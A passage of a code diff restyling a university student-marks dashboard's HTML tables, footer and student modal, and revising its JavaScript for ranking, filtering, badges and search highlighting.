+                                onclick="sortTable('enrollment')">Enrollment</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('name')">Student Name</th>
+                            <th
+                                class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]">
+                                Mentor</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('dm')">DM</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('coa')">COA</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('fsd2')">FSD-II</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('python2')">Python-II</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('toc')">TOC</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('total')">Total</th>
+                            <th class="text-left px-4 py-3 text-[0.65rem] font-bold uppercase tracking-wide text-[var(--text-tertiary)]"
+                                onclick="sortTable('sem3spi')">Sem-III SPI</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody"></tbody>
+                </table>
+            </div>
+            <!-- Load More Bar -->
+            <div id="loadMoreBar" class="load-bar hidden text-center py-2.5">
+                <button onclick="loadMore()" id="loadMoreBtn"
+                    class="text-xs font-semibold text-[#7c6aef] hover:underline cursor-pointer bg-transparent border-none"
+                    style="font-family:inherit">
+                    <i class="ri-arrow-down-line"></i> Show more rows (<span id="remainCount">0</span> remaining)
+                </button>
+            </div>
+        </div>
+
+        <!-- DIVISION & EXAM ANALYTICS MATRIX CARDS -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-3 sm:gap-4 mb-6">
+            <!-- Division Subject Performance Matrix -->
+            <div class="card rounded-xl p-4">
+                <h3
+                    class="text-xs font-bold uppercase text-[var(--text-secondary)] tracking-wider mb-3 flex items-center gap-1.5">
+                    <i class="ri-grid-line text-[#7c6aef]"></i> Division-Wise Subject Performance Matrix
+                </h3>
+                <div class="overflow-x-auto">
+                    <table class="tbl w-full text-center">
                         <thead>
                             <tr>
-                                <th style="text-align: left;">Division</th>
-                                <th>DM Avg</th>
-                                <th>COA Avg</th>
-                                <th>FSD-II Avg</th>
-                                <th>Python-II Avg</th>
-                                <th>TOC Avg</th>
-                                <th>Overall Avg</th>
+                                <th class="text-left px-3 py-2 text-[0.65rem] text-[var(--text-tertiary)]">Div</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">DM</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">COA</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">FSD-II</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">Python-II</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">TOC</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-cyan-400">Total Avg</th>
                             </tr>
                         </thead>
-                        <tbody id="matrixTableBody">
-                            <!-- Dynamically filled -->
-                        </tbody>
+                        <tbody id="matrixTableBody"></tbody>
                     </table>
                 </div>
             </div>
-            
-            <!-- Right: Exam Wise Performance Matrix -->
-            <div class="glass-panel comparison-matrix-bar">
-                <div class="toppers-title" style="margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; width: 100%;">
-                    <div style="display: flex; align-items: center; gap: 8px;">
-                        <i class="ri-calendar-todo-line" style="color: var(--accent); font-size: 1.2rem;"></i>
-                        <span>Exam Wise Division Performance</span>
-                    </div>
-                    <select class="control-input" id="examMatrixSubject" onchange="updateExamMatrix()" style="width: 130px; padding: 4px 8px; font-size: 0.8rem; margin: 0; background: var(--bg-glass-hover); border: 1px solid rgba(255,255,255,0.1);">
+
+            <!-- Exam Term-Wise Matrix -->
+            <div class="card rounded-xl p-4">
+                <div class="flex items-center justify-between mb-3">
+                    <h3
+                        class="text-xs font-bold uppercase text-[var(--text-secondary)] tracking-wider flex items-center gap-1.5">
+                        <i class="ri-pulse-line text-emerald-400"></i> Term Exam Progressive Matrix
+                    </h3>
+                    <select id="examMatrixSubject" onchange="updateExamMatrix()"
+                        class="fi py-1 px-2.5 rounded text-xs font-semibold outline-none">
                         <option value="dm">Discrete Math</option>
                         <option value="coa">COA</option>
                         <option value="fsd2">FSD-II</option>
@@ -1204,1043 +1095,908 @@
                         <option value="toc">TOC</option>
                     </select>
                 </div>
-                <div style="overflow-x: auto;">
-                    <table class="matrix-table">
+                <div class="overflow-x-auto">
+                    <table class="tbl w-full text-center">
                         <thead>
                             <tr>
-                                <th style="text-align: left;">Division</th>
-                                <th>T1 Avg</th>
-                                <th>T2 Avg</th>
-                                <th>T3 Avg</th>
-                                <th id="examMatrixT4Header">T4 Avg</th>
-                                <th>Total Avg</th>
+                                <th class="text-left px-3 py-2 text-[0.65rem] text-[var(--text-tertiary)]">Div</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">T1 Avg</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">T2 Avg</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">T3 Avg</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-[var(--text-tertiary)]">T4 Avg</th>
+                                <th class="px-2 py-2 text-[0.65rem] text-emerald-400">Overall</th>
                             </tr>
                         </thead>
-                        <tbody id="examMatrixTableBody">
-                            <!-- Dynamically filled -->
-                        </tbody>
+                        <tbody id="examMatrixTableBody"></tbody>
                     </table>
                 </div>
             </div>
         </div>
 
-        <!-- CONTROLS -->
-        <div class="glass-panel controls-bar">
-            <div class="view-tabs">
-                <div class="tab-indicator" id="tabIndicator"></div>
-                <button class="tab-btn view-tab active" onclick="setMode('new', this)">Rank View</button>
-                <button class="tab-btn view-tab" onclick="setMode('original', this)">Classic View</button>
-            </div>
-
-            <div class="view-tabs" style="gap: 5px;">
-                <div class="tab-indicator" id="deptTabIndicator"></div>
-
-                <button class="tab-btn dept-tab active" onclick="setDept('Overall', this)">Overall</button>
-                <button class="tab-btn dept-tab" onclick="setDept('SY1', this)">SY1</button>
-                <button class="tab-btn dept-tab" onclick="setDept('SY2', this)">SY2</button>
-                <button class="tab-btn dept-tab" onclick="setDept('SY3', this)">SY3</button>
-                <button class="tab-btn dept-tab" onclick="setDept('SY4', this)">SY4</button>
-            </div>
-
-            <div class="filter-group">
-                <div class="search-wrapper">
-                    <i class="ri-search-line"></i>
-                    <input type="text" class="control-input" id="searchInput" placeholder="Search...">
-                </div>
-                <select class="control-input" id="branchFilter" style="width: 150px;">
-                    <option value="">All Branches</option>
-                </select>
-                <select class="control-input" id="divFilter" style="width: 150px;">
-                    <option value="">All Divisions</option>
-                </select>
-            </div>
-        </div>
-
-        <!-- TABLE -->
-        <div class="glass-panel table-wrapper">
-            <div class="table-scroll" id="tableScroll">
-                <table>
-                    <thead>
-                        <tr>
-                            <th onclick="sortTable('rank')">Rank <i class="ri-arrow-up-down-line"></i></th>
-                            <th onclick="sortTable('roll')">Roll No <i class="ri-arrow-up-down-line"></i></th>
-                            <th>DEPT</th>
-                            <th onclick="sortTable('div')">Div <i class="ri-arrow-up-down-line"></i></th>
-                            <th onclick="sortTable('branch')">Branch <i class="ri-arrow-up-down-line"></i></th>
-                            <th onclick="sortTable('enrollment')">Enrollment</th>
-                            <th onclick="sortTable('name')">Student Name</th>
-                            <th>Mentor</th>
-                            <th onclick="sortTable('dm')">DM</th>
-                            <th onclick="sortTable('coa')">COA</th>
-                            <th onclick="sortTable('fsd2')">FSD-II</th>
-                            <th onclick="sortTable('python2')">Python-II</th>
-                            <th onclick="sortTable('toc')">TOC</th>
-                            <th onclick="sortTable('total')">Total</th>
-                            <th onclick="sortTable('sem3spi')" style="color:var(--accent);">SEM-III SPI <i class="ri-arrow-up-down-line"></i></th>
-                            <th class="th-sem-hist" onclick="sortTable('sem1')" style="color:#22d3ee;display:none">Sem I SPI <i class="ri-arrow-up-down-line"></i></th>
-                            <th class="th-sem-hist" onclick="sortTable('sem2')" style="color:#22d3ee;display:none">Sem II SPI <i class="ri-arrow-up-down-line"></i></th>
-                            <th class="th-sem-hist" onclick="sortTable('sem3marks')" style="color:#f472b6;display:none">Sem III /10 <i class="ri-arrow-up-down-line"></i></th>
-                            <th class="th-sem-hist" onclick="sortTable('sem3spi2')" style="color:#f472b6;display:none">SPI×2 /20 <i class="ri-arrow-up-down-line"></i></th>
-                            <th class="th-sem-hist" onclick="sortTable('totalSum')" style="color:#fbbf24;display:none">Total /40 <i class="ri-arrow-up-down-line"></i></th>
-                        </tr>
-                    </thead>
-                    <tbody id="tableBody"></tbody>
-                </table>
-            </div>
-            <!-- Load More Bar -->
-            <div id="loadMoreBar" class="hidden" style="text-align:center;padding:10px 0;border-top:1px solid var(--border-glass);background:var(--bg-glass)">
-                <button onclick="loadMore()" style="font-size:0.8rem;font-weight:600;color:var(--primary);background:none;border:none;cursor:pointer;font-family:inherit">
-                    <i class="ri-arrow-down-line"></i> Show more rows (<span id="remainCount">0</span> remaining)
-                </button>
-            </div>
-        </div>
-        <!-- Badge -->
-        <div style="text-align:right;margin-top:8px;font-size:0.75rem;color:var(--text-muted)">
-            <span id="badgeCount">0</span> students shown
-        </div>
-
-        <!-- Student Detail Modal -->
-        <div id="studentModal" class="modal-overlay hidden" onclick="closeModal()">
-            <div class="glass-panel modal-card" onclick="event.stopPropagation()">
-                <button class="modal-close" onclick="closeModal()"><i class="ri-close-line"></i></button>
-                <div class="modal-header">
-                    <h2 id="modalName">Student Name</h2>
-                    <p id="modalInfo">Branch • Div • Roll No</p>
-                </div>
-                <div id="modalAlertBanner" class="alert-banner hidden"></div>
-                <div class="modal-body-grid">
-                    <!-- Profile Column -->
-                    <div class="modal-profile-column">
-                        <div class="avatar-circle">
-                            <i class="ri-user-3-line"></i>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">Enrollment</span>
-                            <span class="detail-value" id="modalEnroll">--</span>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">Mentor</span>
-                            <span class="detail-value" id="modalMentor">--</span>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">Total Score</span>
-                            <span class="detail-value" id="modalTotal" style="color:var(--accent);">--</span>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">Class Rank</span>
-                            <span class="detail-value" id="modalRank" style="color:var(--primary);">--</span>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">Peer Comparison</span>
-                            <span class="detail-value" id="modalDivComp">--</span>
-                        </div>
-                        <div class="profile-detail-item">
-                            <span class="detail-label">SPI Trajectory</span>
-                            <span class="detail-value" id="modalSpiTrajectory">--</span>
-                        </div>
+        <!-- FOOTER -->
+        <footer class="footer-section mt-4 py-5 px-4 rounded-xl">
+            <div class="flex flex-col sm:flex-row justify-between items-center gap-3">
+                <div class="flex items-center gap-2">
+                    <div
+                        class="w-7 h-7 rounded-lg bg-gradient-to-br from-[#7c6aef] to-[#22d3ee] flex items-center justify-center">
+                        <i class="ri-graduation-cap-fill text-white text-xs"></i>
                     </div>
-                    
-                    <!-- Performance Column -->
-                    <div class="modal-perf-column">
-                        <h3>Subject Performance</h3>
-                        <div class="subject-bars" id="modalSubjectBars">
-                            <!-- Dynamically filled -->
-                        </div>
-                        
-                        <h3 style="margin-top: 25px;">Semester SPI Progress</h3>
-                        <div class="spi-timeline">
-                            <div class="spi-node">
-                                <span class="spi-sem">Sem I</span>
-                                <span class="spi-val" id="modalSem1">--</span>
-                            </div>
-                            <div class="spi-node">
-                                <span class="spi-sem">Sem II</span>
-                                <span class="spi-val" id="modalSem2">--</span>
-                            </div>
-                            <div class="spi-node">
-                                <span class="spi-sem">Sem III</span>
-                                <span class="spi-val" id="modalSem3">--</span>
-                            </div>
-                            <div class="spi-node accent">
-                                <span class="spi-sem">Sem IV (Est)</span>
-                                <span class="spi-val" id="modalSem4">--</span>
-                            </div>
-                        </div>
+                    <div>
+                        <span class="text-xs font-bold text-[var(--text)]">GradeX</span>
+                        <span class="text-[0.6rem] text-[var(--text-tertiary)] block leading-none">LJ University &bull;
+                            SY Sem-IV 2026</span>
                     </div>
                 </div>
+                <div class="flex items-center gap-4 text-[0.6rem] text-[var(--text-tertiary)]">
+                    <span class="flex items-center gap-1"><i class="ri-database-2-line text-[#7c6aef]"></i> <span
+                            id="footerStudentCount">0</span> Records</span>
+                    <span class="flex items-center gap-1"><i class="ri-time-line text-emerald-400"></i> Last Updated:
+                        July 2026</span>
+                    <span class="flex items-center gap-1"><i class="ri-code-s-slash-line text-pink-400"></i> Built with
+                        <span class="text-[var(--text-secondary)] font-medium">precision</span></span>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- STUDENT MODAL POPUP -->
+    <div id="studentModal" class="modal-overlay flex items-center justify-center p-3">
+        <div class="modal-card rounded-2xl w-full max-w-xl p-5 sm:p-6 relative max-h-[90vh] overflow-y-auto">
+            <button onclick="closeModal()"
+                class="absolute top-4 right-4 text-[var(--text-tertiary)] hover:text-[var(--text)] text-xl w-8 h-8 rounded-full bg-[var(--bg-surface-2)] flex items-center justify-center transition-colors">
+                <i class="ri-close-line"></i>
+            </button>
+
+            <!-- Header Info -->
+            <div class="mb-4">
+                <span id="modalAlertBanner"
+                    class="hidden mb-3 p-2 rounded-lg bg-red-500/15 border border-red-500/30 text-red-400 text-xs font-semibold flex items-center gap-1.5"></span>
+                <div class="flex items-start justify-between">
+                    <div>
+                        <h2 id="modalName" class="text-xl font-bold text-[var(--text)] tracking-tight">--</h2>
+                        <p id="modalInfo" class="text-xs text-[var(--text-secondary)] font-medium mt-0.5">--</p>
+                    </div>
+                    <span id="modalRank"
+                        class="px-3 py-1 rounded-full text-xs font-bold bg-[#7c6aef]/15 text-[#7c6aef] border border-[#7c6aef]/30">#--</span>
+                </div>
+            </div>
+
+            <!-- Basic Info Grid -->
+            <div
+                class="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4 p-3 rounded-xl bg-[var(--bg-surface-2)] border border-[var(--border)] text-xs">
+                <div>
+                    <span
+                        class="block text-[0.6rem] uppercase text-[var(--text-tertiary)] font-semibold">Enrollment</span>
+                    <span id="modalEnroll" class="font-mono font-medium text-[var(--text)]">--</span>
+                </div>
+                <div>
+                    <span class="block text-[0.6rem] uppercase text-[var(--text-tertiary)] font-semibold">Mentor</span>
+                    <span id="modalMentor" class="font-medium text-[var(--text)]">--</span>
+                </div>
+                <div>
+                    <span class="block text-[0.6rem] uppercase text-[var(--text-tertiary)] font-semibold">Total
+                        Score</span>
+                    <span id="modalTotal" class="font-bold text-emerald-400">--</span>
+                </div>
+                <div>
+                    <span class="block text-[0.6rem] uppercase text-[var(--text-tertiary)] font-semibold">Div
+                        Diff</span>
+                    <span id="modalDivComp" class="font-semibold">--</span>
+                </div>
+            </div>
+
+            <!-- SPI Breakdown Grid -->
+            <div class="mb-4">
+                <span
+                    class="block text-[0.65rem] uppercase tracking-wider text-[var(--text-tertiary)] font-bold mb-2">SPI
+                    Performance Trajectory</span>
+                <div
+                    class="grid grid-cols-4 gap-2 p-3 rounded-xl bg-[var(--bg-surface-2)] border border-[var(--border)] text-center text-xs">
+                    <div>
+                        <span class="block text-[0.6rem] text-[var(--text-tertiary)]">Sem 1</span>
+                        <span id="modalSem1" class="font-semibold text-cyan-400">--</span>
+                    </div>
+                    <div>
+                        <span class="block text-[0.6rem] text-[var(--text-tertiary)]">Sem 2</span>
+                        <span id="modalSem2" class="font-semibold text-cyan-400">--</span>
+                    </div>
+                    <div>
+                        <span class="block text-[0.6rem] text-[var(--text-tertiary)]">Sem 3</span>
+                        <span id="modalSem3" class="font-semibold text-pink-400">--</span>
+                    </div>
+                    <div>
+                        <span class="block text-[0.6rem] text-[var(--text-tertiary)]">Est. Sem 4</span>
+                        <span id="modalSem4" class="font-bold text-emerald-400">--</span>
+                    </div>
+                </div>
+                <div class="flex justify-between items-center text-[0.65rem] mt-1.5 px-1">
+                    <span class="text-[var(--text-tertiary)]">Sem 3 to Sem 4 Trajectory:</span>
+                    <span id="modalSpiTrajectory" class="font-semibold">--</span>
+                </div>
+            </div>
+
+            <!-- Subject Progress Bars -->
+            <div>
+                <span
+                    class="block text-[0.65rem] uppercase tracking-wider text-[var(--text-tertiary)] font-bold mb-2">Sem-IV
+                    Subject Marks & Letter Grades</span>
+                <div id="modalSubjectBars" class="space-y-2.5"></div>
             </div>
         </div>
     </div>
 
-    <script src="new_datamarksheet.js?v=20"></script>
+    <!-- Scripts -->
+    <script src="new_datamarksheet.js?v=5"></script>
     <script>
-        (function () {
-            'use strict';
+            (function () {
+                'use strict';
 
-            /* ═══ THEME ═══ */
-            function toggleTheme() {
-                const t = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
-                document.documentElement.setAttribute('data-theme', t);
-                localStorage.setItem('theme', t);
-                scheduleChartUpdate();
-            }
-            window.toggleTheme = toggleTheme;
-            (function () { document.documentElement.setAttribute('data-theme', localStorage.getItem('theme') || 'dark'); })();
-
-            /* ═══ STATE ═══ */
-            let currentMode = 'new', currentDept = 'Overall';
-            let filteredData = [], gradeChart = null;
-            let BATCH = 60, renderedCount = 0;
-            let debounceId = null, chartRafId = null;
-            let sortDir = 'desc', lastSortKey = '';
-            let currentSearchQuery = ''; // Store search query globally for highlights
-
-            /* ═══ PREPROCESS DATA (one-time) ═══ */
-            const rawData = data.map(s => {
-                s.dm      = s.dm      || 0;
-                s.coa     = s.coa     || 0;
-                s.fsd2    = s['fsd-ii'] || s.fsd2 || 0;
-                s.python2 = s.python2 || 0;
-                s.toc     = s.toc     || 0;
-                s.total   = s.dm + s.coa + s.fsd2 + s.python2 + s.toc;
-                if (!s.dept) s.dept = 'SY4';
-                
-                // Calculate backlogs (< 35 marks is backlog)
-                let backlogs = 0;
-                if (s.dm < 35) backlogs++;
-                if (s.coa < 35) backlogs++;
-                if (s.fsd2 < 35) backlogs++;
-                if (s.python2 < 35) backlogs++;
-                if (s.toc < 35) backlogs++;
-                s.backlogs = backlogs;
-                
-                return s;
-            }).sort((a, b) => b.total - a.total);
-
-            rawData.forEach((s, i) => s.globalRank = i + 1);
-
-            const depts = [...new Set(rawData.map(s => s.dept))];
-            const dc = {}; depts.forEach(d => dc[d] = 1);
-            const allData = rawData.map(s => { s.deptRank = dc[s.dept]++; return s; });
-
-            // Calculate global subject toppers thresholds
-            window.maxMarks = {
-                dm: Math.max(...allData.map(s => s.dm)),
-                coa: Math.max(...allData.map(s => s.coa)),
-                fsd2: Math.max(...allData.map(s => s.fsd2)),
-                python2: Math.max(...allData.map(s => s.python2)),
-                toc: Math.max(...allData.map(s => s.toc))
-            };
-
-            /* ═══ TAB INDICATOR ═══ */
-            function setIndicator(el, id) {
-                const ind = document.getElementById(id);
-                if (!ind || !el) return;
-                const r = el.getBoundingClientRect(), p = el.parentElement.getBoundingClientRect();
-                ind.style.width  = r.width + 'px';
-                ind.style.left   = (r.left - p.left) + 'px';
-            }
-
-            window.setMode = function (mode, el) {
-                currentMode = mode;
-                setIndicator(el, 'tabIndicator');
-                document.querySelectorAll('.view-tab').forEach(t => { t.classList.remove('active'); t.style.color = ''; });
-                el.classList.add('active'); el.style.color = '#fff';
-                run();
-            };
-
-            window.setDept = function (dept, el) {
-                currentDept = dept;
-                setIndicator(el, 'deptTabIndicator');
-                document.querySelectorAll('.dept-tab').forEach(t => { t.classList.remove('active'); t.style.color = ''; });
-                el.classList.add('active'); el.style.color = '#fff';
-                updateDivisions(dept);
-                updateBranches(dept);
-                updateSemHistColumns();
-                const sub = document.getElementById('headerSubtitle');
-                if (sub) sub.innerText = 'Advanced Academic Performance Dashboard \u2022 ' + dept + ' Sem-IV';
-                run();
-            };
-
-            /* ═══ SEM HIST COLUMNS VISIBILITY ═══ */
-            function updateSemHistColumns() {
-                const show = (currentDept === 'SY1' || currentDept === 'SY2' || currentDept === 'SY4' || currentDept === 'Overall');
-                document.querySelectorAll('.th-sem-hist').forEach(th => th.style.display = show ? '' : 'none');
-            }
-
-            /* ═══ FILTERS ═══ */
-            function updateBranches(dept) {
-                const sel = document.getElementById('branchFilter');
-                sel.innerHTML = '<option value="">All Branches</option>';
-                const pool = dept !== 'Overall' ? allData.filter(s => s.dept === dept) : allData;
-                [...new Set(pool.map(s => s.branch))].filter(Boolean).sort().forEach(b => sel.add(new Option(b, b)));
-            }
-
-            function updateDivisions(dept) {
-                const sel = document.getElementById('divFilter');
-                sel.innerHTML = '<option value="">All Divisions</option>';
-                const map = { SY1: ['A',9], SY2: ['B',8], SY3: ['C',9], SY4: ['D',9] };
-                if (dept === 'Overall') {
-                    for (const [dep, info] of Object.entries(map)) {
-                        const [pfx, n] = info;
-                        for (let i = 1; i <= n; i++) {
-                            sel.add(new Option(`${dep} - ${pfx}${i}`, pfx + i));
-                        }
-                    }
-                } else if (map[dept]) {
-                    const [pfx, n] = map[dept];
-                    for (let i = 1; i <= n; i++) sel.add(new Option(pfx + i, pfx + i));
+                /* ═══ THEME ═══ */
+                function toggleTheme() {
+                    const t = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+                    document.documentElement.setAttribute('data-theme', t);
+                    localStorage.setItem('theme', t);
+                    scheduleChartUpdate();
                 }
-            }
+                window.toggleTheme = toggleTheme;
 
-            function filterData() {
-                const search  = document.getElementById('searchInput').value.toLowerCase().trim();
-                currentSearchQuery = search; // Store search query for highlights
-                const branch  = document.getElementById('branchFilter').value;
-                const divSel  = document.getElementById('divFilter').value;
+                (function () { document.documentElement.setAttribute('data-theme', localStorage.getItem('theme') || 'dark'); })();
 
-                let pool = currentDept !== 'Overall' ? allData.filter(s => s.dept === currentDept) : allData;
+                /* ═══ STATE ═══ */
+                let currentMode = 'new', currentDept = 'Overall';
+                let filteredData = [], gradeChart = null;
+                let BATCH = 60, renderedCount = 0;
+                let debounceId = null, chartRafId = null;
+                let lastSortKey = '', sortDir = 'desc';
+                let currentSearchQuery = '';
 
-                filteredData = pool.filter(s => {
-                    let ms = true;
-                    if (search) {
-                        const isNum = /^\d+$/.test(search);
-                        ms = (isNum && search.length < 5 && s.roll == search)
-                            || s.name.toLowerCase().includes(search)
-                            || s.enrollment.includes(search)
-                            || s.mentor.toLowerCase().includes(search);
-                    }
-                    const mb = !branch  || s.branch === branch;
-                    const md = !divSel  || s.div === divSel;
-                    return ms && mb && md;
+                /* ═══ PREPROCESS DATA (one-time) ═══ */
+                const rawData = (typeof data !== 'undefined' ? data : []).map(s => {
+                    s.dm = parseFloat(s.dm) || 0;
+                    s.coa = parseFloat(s.coa) || 0;
+                    s.fsd2 = parseFloat(s.fsd2) || 0;
+                    s.python2 = parseFloat(s.python2) || 0;
+                    s.toc = parseFloat(s.toc) || 0;
+                    s.total = s.dm + s.coa + s.fsd2 + s.python2 + s.toc;
+                    if (!s.dept) s.dept = 'SY4';
+                    s.backlogs = parseInt(s.backlogs || 0);
+                    return s;
+                }).sort((a, b) => b.total - a.total);
+
+                // Compute Top Subject Marks for Badge Highlights
+                window.maxMarks = { dm: 0, coa: 0, fsd2: 0, python2: 0, toc: 0 };
+                rawData.forEach(s => {
+                    if (s.dm > window.maxMarks.dm) window.maxMarks.dm = s.dm;
+                    if (s.coa > window.maxMarks.coa) window.maxMarks.coa = s.coa;
+                    if (s.fsd2 > window.maxMarks.fsd2) window.maxMarks.fsd2 = s.fsd2;
+                    if (s.python2 > window.maxMarks.python2) window.maxMarks.python2 = s.python2;
+                    if (s.toc > window.maxMarks.toc) window.maxMarks.toc = s.toc;
                 });
 
-                if (currentMode === 'new') {
-                    filteredData.sort((a, b) => currentDept === 'Overall' ? a.globalRank - b.globalRank : a.deptRank - b.deptRank);
-                } else {
-                    filteredData.sort((a, b) => a.roll - b.roll);
+                rawData.forEach((s, i) => s.globalRank = i + 1);
+
+                const depts = [...new Set(rawData.map(s => s.dept))];
+                const dc = {}; depts.forEach(d => dc[d] = 1);
+                const allData = rawData.map(s => { s.deptRank = dc[s.dept]++; return s; });
+
+                /* ═══ TAB INDICATOR ═══ */
+                function setIndicator(el, id) {
+                    const ind = document.getElementById(id);
+                    if (!ind || !el) return;
+                    const r = el.getBoundingClientRect(), p = el.parentElement.getBoundingClientRect();
+                    ind.style.width = r.width + 'px';
+                    ind.style.left = (r.left - p.left) + 'px';
                 }
-            }
 
-            /* ═══ BADGE BUILDER ═══ */
-            function getMarkBadgeHTML(val, subKey) {
-                let colorClass = '';
-                const isTopper = window.maxMarks && val === window.maxMarks[subKey] && val > 0;
-                
-                if (isTopper) colorClass = 'badge-topper';
-                else if (val >= 90) colorClass = 'badge-green';
-                else if (val >= 75) colorClass = 'badge-blue';
-                else if (val >= 35) colorClass = 'badge-yellow';
-                else colorClass = 'badge-red';
-                
-                const suffix = isTopper ? '' : '';
-                return `<span class="mark-badge ${colorClass}">${val}${suffix}</span>`;
-            }
+                window.setMode = function (mode, el) {
+                    currentMode = mode;
+                    setIndicator(el, 'tabIndicator');
+                    document.querySelectorAll('.view-tab').forEach(t => t.classList.remove('active'));
+                    el.classList.add('active');
+                    el.style.color = '#fff';
+                    document.querySelectorAll('.view-tab:not(.active)').forEach(t => t.style.color = '');
+                    run();
+                };
 
-            /* ═══ TEXT HIGHLIGHTER ═══ */
-            function highlightText(text, search) {
-                if (!search) return text;
-                // If it contains signature wrapper, highlight inside it safely
-                if (text.includes('sig-wrapper')) {
-                    const innerText = 'Daksh Bhavsar';
+                window.setDept = function (dept, el) {
+                    currentDept = dept;
+                    setIndicator(el, 'deptTabIndicator');
+                    document.querySelectorAll('.dept-tab').forEach(t => { t.classList.remove('active'); t.style.color = ''; });
+                    el.classList.add('active'); el.style.color = '#fff';
+                    updateDivisions(dept); updateBranches(dept);
+                    document.getElementById('headerSubtitle').textContent =
+                        'Advanced Academic Performance Dashboard \u2022 ' + dept + ' Sem-IV';
+                    run();
+                };
+
+                /* ═══ FILTERS ═══ */
+                function updateBranches(dept) {
+                    const sel = document.getElementById('branchFilter');
+                    if (!sel) return;
+                    sel.innerHTML = '<option value="">All Branches</option>';
+                    const pool = dept !== 'Overall' ? allData.filter(s => s.dept === dept) : allData;
+                    [...new Set(pool.map(s => s.branch))].filter(Boolean).sort().forEach(b => sel.add(new Option(b, b)));
+                }
+
+                function updateDivisions(dept) {
+                    const sel = document.getElementById('divFilter');
+                    if (!sel) return;
+                    sel.innerHTML = '<option value="">All Divisions</option>';
+                    const pool = dept !== 'Overall' ? allData.filter(s => s.dept === dept) : allData;
+                    [...new Set(pool.map(s => s.div))].filter(Boolean).sort().forEach(d => sel.add(new Option(d, d)));
+                }
+
+                function filterData() {
+                    const search = document.getElementById('searchInput').value.toLowerCase().trim();
+                    currentSearchQuery = search;
+                    const branch = document.getElementById('branchFilter').value;
+                    const divSel = document.getElementById('divFilter').value;
+
+                    let pool = currentDept !== 'Overall' ? allData.filter(s => s.dept === currentDept) : allData;
+
+                    filteredData = pool.filter(s => {
+                        let ms = true;
+                        if (search) {
+                            const isNum = /^\d+$/.test(search);
+                            ms = (isNum && search.length < 5 && s.roll == search)
+                                || s.name.toLowerCase().includes(search)
+                                || s.enrollment.includes(search)
+                                || (s.mentor && s.mentor.toLowerCase().includes(search));
+                        }
+                        const mb = !branch || s.branch === branch;
+                        const md = !divSel || s.div === divSel;
+                        return ms && mb && md;
+                    });
+
+                    if (currentMode === 'new') {
+                        filteredData.sort((a, b) => currentDept === 'Overall' ? a.globalRank - b.globalRank : a.deptRank - b.deptRank);
+                    } else {
+                        filteredData.sort((a, b) => a.roll - b.roll);
+                    }
+                }
+
+                /* ═══ BADGE BUILDER ═══ */
+                function getMarkBadgeHTML(val, subKey) {
+                    let colorClass = '';
+                    const isTopper = window.maxMarks && val === window.maxMarks[subKey] && val > 0;
+
+                    if (isTopper) colorClass = 'badge-topper';
+                    else if (val >= 90) colorClass = 'badge-green';
+                    else if (val >= 75) colorClass = 'badge-blue';
+                    else if (val >= 35) colorClass = 'badge-yellow';
+                    else colorClass = 'badge-red';
+
+                    return `<span class="mark-badge ${colorClass}">${val.toFixed(1)}</span>`;
+                }
+
+                /* ═══ TEXT HIGHLIGHTER ═══ */
+                function highlightText(text, search) {
+                    if (!search) return text;
                     const escaped = search.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&');
-                    const highlightedInner = innerText.replace(new RegExp(escaped, 'gi'), match => `<mark class="search-match">${match}</mark>`);
-                    return `<span class="sig-wrapper"><span class="sig-crown">👑</span><span class="sig-text">${highlightedInner}</span></span>`;
-                }
-                const escaped = search.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&');
-                return text.replace(new RegExp(escaped, 'gi'), match => `<mark class="search-match">${match}</mark>`);
-            }
-
-            /* ═══ ROW BUILDER (string concat = fastest) ═══ */
-            function buildRowHTML(s) {
-                const rank    = currentDept === 'Overall' ? s.globalRank : s.deptRank;
-                const roll    = s.roll;
-                const div     = s.div;
-
-                let cls = '';
-                if (rank <= 3 && currentMode === 'new') cls = 'top-rank';
-                const isHL = s.dept === 'SY4' && [35, 31, 63, 86, 72].includes(s.roll);
-                if (isHL) cls += ' highlight-row';
-
-                const dot  = isHL ? '<span class="hl-dot"></span>' : '';
-                
